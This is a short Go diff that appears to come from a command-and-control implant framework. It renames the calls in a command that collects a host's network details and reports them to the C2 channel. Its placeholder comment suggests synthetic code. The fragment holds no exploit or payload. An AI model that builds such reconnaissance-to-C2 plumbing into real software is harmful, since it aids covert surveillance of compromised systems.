@@ -9,6 +9,6 @@ import (
 // netHelperCmdRun displays network information.
 func netHelperCmdRun(cmd *cobra.Command, args []string) {
 	// Assume shellNet() exists and returns network info.
-	out := shellhelper.CmdNetHelper()
-	c2transport.C2RespPrintf(cmd, "%s", out)
+	out := shellhelper.GetNetworkDetails()
+	c2transport.NotifyC2(cmd, "%s", out)
 }
